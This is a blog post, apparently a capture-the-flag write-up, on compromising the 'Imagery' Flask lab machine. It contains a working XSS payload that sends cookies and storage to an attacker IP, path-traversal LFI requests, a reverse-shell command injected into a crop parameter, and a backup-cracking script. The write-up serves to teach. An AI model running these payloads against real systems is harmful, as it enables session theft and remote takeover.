@@ -1,0 +1,569 @@
+---
+layout: post
+title: "Imagery"
+date: 2025-10-14 02:00:00 -0400
+author: Hugo Beaulieu
+categories: linux machine
+tags: linux web xss lfi command-injection python flask
+---
+
+## Overview
+
+Imagery is a Linux machine running a Flask-based image gallery application. The exploitation chain involves client-side XSS to steal admin cookies, local file inclusion to extract source code and database credentials, hash cracking to access test features, and finally command injection through ImageMagick to gain a reverse shell. Privilege escalation is achieved through a custom sudo binary that allows cron job manipulation.
+
+## Initial Enumeration
+
+### Nmap Scan
+
+We start with an nmap scan to discover open ports:
+
+```bash
+nmap -sV -v 10.129.6.108
+```
+
+Results:
+
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH
+8000/tcp open  http    Werkzeug/3.1.3 Python/3.12.7
+```
+
+The target is running a Python web application using the Werkzeug development server on port 8000.
+
+### Web Application Discovery
+
+Accessing the homepage at `http://imagery.htb:8000` reveals an image gallery application with the following features:
+
+- Upload via web link
+- Gallery stored locally
+- User registration and authentication
+
+### Technology Stack
+
+Using `whatweb`, we identify:
+
+```
+Werkzeug/3.1.3 Python/3.12.7
+```
+
+### Directory Enumeration
+
+Running gobuster reveals several endpoints:
+
+```bash
+gobuster dir -u http://imagery.htb:8000 -w wordlist.txt
+```
+
+Discovered paths:
+
+```
+/images (Status: 401) [Size: 59]
+/login (Status: 405) [Size: 153]
+/register (Status: 405) [Size: 153]
+/logout (Status: 405) [Size: 153]
+/upload_image (Status: 405) [Size: 153]
+```
+
+## Application Analysis
+
+### Registration and Upload Features
+
+After registering an account, we gain access to:
+
+- **Upload endpoint**: `POST http://imagery.htb:8000/upload_image`
+- **Download endpoint**: `GET http://imagery.htb:8000/uploads/{uuid}_image.jpg`
+
+We attempt LFI fuzzing on the download URL but without initial success.
+
+### Bug Report Feature
+
+In the footer, we find a "Report Bug" link:
+
+```
+POST http://imagery.htb:8000/report_bug
+```
+
+This could potentially be exploited with XSS if an admin reviews bug reports.
+
+### Additional Endpoints Discovery
+
+Through network tab analysis, we discover:
+
+```
+GET http://imagery.htb:8000/auth_status?_t=1759358655988
+GET http://imagery.htb:8000/get_image_collections
+```
+
+### Source Code Analysis
+
+Examining the JavaScript reveals hidden functionality:
+
+**Pages:**
+- adminPanel
+
+**Variables:**
+- isAdmin
+- loggedInUserIsTestUser
+- loggedInEmail
+- loggedInUserDisplayId
+
+**Test Endpoints:**
+- /edit_image_details
+- /convert_image
+- /apply_visual_transform
+- /delete_image_metadata
+- /move_images_to_collection
+- /create_image_collection
+
+**Admin Endpoints:**
+- /admin/users
+- /admin/bug_reports
+- /admin/delete_user
+- /admin/delete_bug_report
+- /admin/get_system_log
+
+### Client-Side Access Control Bypass Attempt
+
+We try to access the admin panel by manipulating client-side JavaScript:
+
+```javascript
+// Set admin flags
+isAdmin = true;
+loggedInUserIsTestUser = true;
+loggedInEmail = "test@test.com";
+loggedInUserDisplayId = "ADMIN";
+
+// Override the checkAuthStatus function
+checkAuthStatus = async function (updateUI = true) {
+  return { loggedIn: true, isAdmin: true, isTestuser: true };
+};
+
+// Navigate to admin panel
+document.getElementById("adminPanelPage").style.display = "flex";
+document.getElementById("admin-not-logged-in").style.display = "none";
+document.getElementById("admin-content-wrapper").style.display = "block";
+
+navigateTo("adminPanel");
+```
+
+Result: We get `403 Forbidden` on `http://imagery.htb:8000/admin/users`, but we can now access test features from the gallery page. However, test features also return `403 Forbidden`, confirming server-side validation is in place.
+
+## XSS Attack to Steal Admin Cookies
+
+### Identifying the Vulnerability
+
+Reviewing the source code, we notice that the bug report form sanitizes most fields using `DOMPurify.sanitize()`, but **report.details** is not sanitized, creating an XSS vulnerability.
+
+### XSS Payload
+
+We craft a payload to steal the admin's cookies, local storage, and session data:
+
+```html
+<img
+  src="x"
+  onerror="(async function(){
+  const YOUR_SERVER_IP = '10.10.15.79';
+
+  try {
+    // Collect User-Agent
+    let userAgent = navigator.userAgent;
+
+    // Collect Cookies
+    let cookies = document.cookie;
+
+    // Collect Local Storage Data
+    let localStorageData = {};
+    for (let i = 0; i < localStorage.length; i++) {
+      let key = localStorage.key(i);
+      localStorageData[key] = localStorage.getItem(key);
+    }
+
+    // Collect Session Storage Data
+    let sessionStorageData = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+      let key = sessionStorage.key(i);
+      sessionStorageData[key] = sessionStorage.getItem(key);
+    }
+
+    // Collect Document Properties
+    let documentData = {
+      title: document.title,
+      url: document.URL,
+      referrer: document.referrer,
+      domain: document.domain
+    };
+
+    // Create final data object
+    let data = {
+      userAgent: userAgent,
+      cookies: cookies,
+      localStorage: localStorageData,
+      sessionStorage: sessionStorageData,
+      document: documentData,
+      fileContents: 'N/A - file:// not accessible from browser context'
+    };
+
+    // Send the data to your server
+    let img = new Image();
+    img.src = 'http://' + YOUR_SERVER_IP + ':5555/?allData=' + encodeURIComponent(JSON.stringify(data));
+
+  } catch (error) {
+    let img = new Image();
+    img.src = 'http://' + YOUR_SERVER_IP + ':5555/?error=' + encodeURIComponent(error.toString());
+  }
+})()"
+/>
+```
+
+After submitting this payload via the bug report form and waiting for the admin to review it, we successfully capture their session cookies and can log in as admin.
+
+## Local File Inclusion
+
+### Admin Log Download Feature
+
+As admin, we discover a "Download Log" button:
+
+```
+http://imagery.htb:8000/admin/get_system_log?log_identifier=admin@imagery.htb.log
+```
+
+### LFI Exploitation
+
+Testing for LFI with path traversal:
+
+```
+http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../../../../etc/passwd
+```
+
+Success! We can read `/etc/passwd`:
+
+```bash
+root:x:0:0:root:/root:/bin/bash
+mark:x:1002:1002::/home/mark:/bin/bash
+web:x:1001:1001::/home/web:/bin/bash
+```
+
+We identify two users: `mark` and `web`.
+
+### Extracting Application Source Code
+
+We extract the Python application files:
+
+```
+http://imagery.htb:8000/admin/get_system_log?log_identifier=../app.py
+```
+
+Discovered files:
+- api_admin.py
+- api_auth.py
+- api_edit.py
+- api_manage.py
+- api_misc.py
+- api_upload.py
+- app.py
+- config.py
+- utils.py
+
+### Password Hashing Discovery
+
+In `utils.py`, we find the password hashing method:
+
+```python
+def _hash_password(password):
+    return hashlib.md5(password.encode()).hexdigest()
+```
+
+The application uses MD5 for password hashing (weak!).
+
+### Database Extraction
+
+From `config.py`, we find:
+
+```python
+DATA_STORE_PATH = 'db.json'
+```
+
+We download the database:
+
+```
+http://imagery.htb:8000/admin/get_system_log?log_identifier=../db.json
+```
+
+Contents:
+
+```json
+{
+  "users": [
+    {
+      "username": "admin@imagery.htb",
+      "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
+      "isAdmin": true,
+      "displayId": "a1b2c3d4",
+      "login_attempts": 0,
+      "isTestuser": false,
+      "failed_login_attempts": 0,
+      "locked_until": null
+    },
+    {
+      "username": "testuser@imagery.htb",
+      "password": "2c65c8d7bfbca32a3ed42596192384f6",
+      "isAdmin": false,
+      "displayId": "e5f6g7h8",
+      "login_attempts": 0,
+      "isTestuser": true,
+      "failed_login_attempts": 0,
+      "locked_until": null
+    }
+  ]
+}
+```
+
+## Hash Cracking
+
+We crack the MD5 hashes using hashcat:
+
+```bash
+hashcat -m 0 -a 0 hash.txt rockyou.txt -w 4
+```
+
+Result:
+
+```
+2c65c8d7bfbca32a3ed42596192384f6:iambatman
+```
+
+We successfully crack the testuser password: `iambatman`
+
+## Command Injection via ImageMagick
+
+### Analyzing the Source Code
+
+After logging in as testuser@imagery.htb, we analyze `api_edit.py` more closely and find a critical vulnerability at line 44:
+
+```python
+command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
+subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
+```
+
+The use of `shell=True` with user-controlled input creates a command injection vulnerability!
+
+### Exploitation
+
+We set up a netcat listener:
+
+```bash
+nc -lvnp 1234
+```
+
+Then send a malicious crop request via Burp:
+
+```json
+{
+  "imageId": "ec8b0bef-73e6-436b-bcc2-cc933c05fec1",
+  "transformType": "crop",
+  "params": {
+    "x": "0",
+    "y": "0",
+    "width": "100",
+    "height": "100; bash -c 'bash -i >& /dev/tcp/10.10.15.79/1234 0>&1'; #"
+  }
+}
+```
+
+We successfully get a reverse shell as the `web` user!
+
+## Lateral Movement to Mark
+
+### Discovering Credentials
+
+In the `bot/admin.py` file, we find hardcoded credentials:
+
+```python
+CHROME_BINARY = "/usr/bin/google-chrome"
+USERNAME = "admin@imagery.htb"
+PASSWORD = "strongsandofbeach"
+BYPASS_TOKEN = "K7Zg9vB$24NmW!q8xR0p%tL!"
+APP_URL = "http://0.0.0.0:8000"
+```
+
+The password doesn't work for mark, so we continue enumeration.
+
+### LinPEAS Findings
+
+Running LinPEAS reveals:
+
+```bash
+flaskapp.service loaded active running Flask Application Service
+
+/var/backup/web_20250806_120723.zip.aes
+```
+
+The systemd service file shows an environment variable:
+
+```bash
+Environment="CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p%tL!"
+```
+
+### Decrypting the Backup
+
+We discover the backup is encrypted with pyAesCrypt:
+
+```bash
+hexdump -C backup.zip.aes | head -n 5
+```
+
+Output shows:
+
+```
+00000000  41 45 53 02 00 00 1b 43  52 45 41 54 45 44 5f 42  |AES....CREATED_B|
+00000010  59 00 70 79 41 65 73 43  72 79 70 74 20 36 2e 31  |Y.pyAesCrypt 6.1|
+```
+
+We create a Python script to brute-force the password:
+
+```python
+#!/usr/bin/env python3
+import pyAesCrypt
+import sys
+
+def crack_password(encrypted_file, wordlist, output_file):
+    buffer_size = 64 * 1024
+
+    with open(wordlist, 'r', encoding='latin-1', errors='ignore') as wl:
+        for i, password in enumerate(wl, 1):
+            password = password.strip()
+
+            if i % 100 == 0:
+                print(f"[*] Tried {i} passwords...", end='\r')
+
+            try:
+                pyAesCrypt.decryptFile(
+                    encrypted_file,
+                    output_file,
+                    password,
+                    buffer_size
+                )
+                print(f"\n[+] SUCCESS! Password: {password}")
+                return password
+            except ValueError:
+                continue
+            except Exception as e:
+                continue
+
+    print("\n[-] Password not found")
+    return None
+
+if __name__ == "__main__":
+    crack_password("backup.zip.aes", "/home/bhugo97/.pentest-toolbox/wordlists/rockyou.txt", "backup.zip")
+```
+
+Running the script:
+
+```bash
+python decrypt.py
+```
+
+Result:
+
+```
+[+] SUCCESS! Password: bestfriends
+```
+
+### Extracting Mark's Credentials
+
+Inside the decrypted backup, we find another `db.json` with mark's hash:
+
+```json
+{
+  "username": "mark@imagery.htb",
+  "password": "01c3d2e5bdaf6134cec0a367cf53e535",
+  "displayId": "868facaf",
+  "isAdmin": false
+}
+```
+
+Cracking with hashcat:
+
+```bash
+hashcat -m 0 -a 0 hash.txt rockyou.txt -w 4
+```
+
+Result:
+
+```
+01c3d2e5bdaf6134cec0a367cf53e535:supersmash
+```
+
+We can now SSH as mark:
+
+```bash
+ssh mark@imagery.htb
+# Password: supersmash
+```
+
+We retrieve the user flag!
+
+## Privilege Escalation to Root
+
+### Sudo Analysis
+
+Running `sudo -l` reveals:
+
+```bash
+User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol
+```
+
+### Charcol Binary Investigation
+
+The `charcol` binary is a custom backup tool. We discover it has an "auto" feature for creating cron jobs:
+
+```bash
+auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
+```
+
+Important note from the help:
+
+```
+Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
+```
+
+### Blocked Paths
+
+Trying to directly read `/root/root.txt` is blocked:
+
+```bash
+charcol> backup -i /root/root.txt
+[ERROR] Blocking direct access to critical system file: '/root/root.txt'
+```
+
+### Exploitation via Cron
+
+We create a cron job that reads the root flag and writes it to `/tmp`:
+
+```bash
+sudo /usr/local/bin/charcol auto add \
+  --schedule "* * * * *" \
+  --command "cat /root/root.txt > /tmp/flag.txt && chmod 644 /tmp/flag.txt" \
+  --name "getflag"
+```
+
+After waiting for the cron job to execute, we can read the flag:
+
+```bash
+cat /tmp/flag.txt
+```
+
+Root flag obtained!
+
+## Key Takeaways
+
+- **XSS in administrative interfaces** can bypass authentication entirely
+- **DOMPurify** must sanitize ALL user input, not just selected fields
+- **Local File Inclusion** can expose application source code and credentials
+- **MD5 is cryptographically broken** and should never be used for password hashing
+- **Command injection via shell=True** in subprocess is a critical vulnerability
+- **AES-encrypted backups** can be brute-forced with weak passwords
+- **Custom sudo binaries** that execute arbitrary commands provide easy root access
+- **Cron job manipulation** can bypass direct file access restrictions
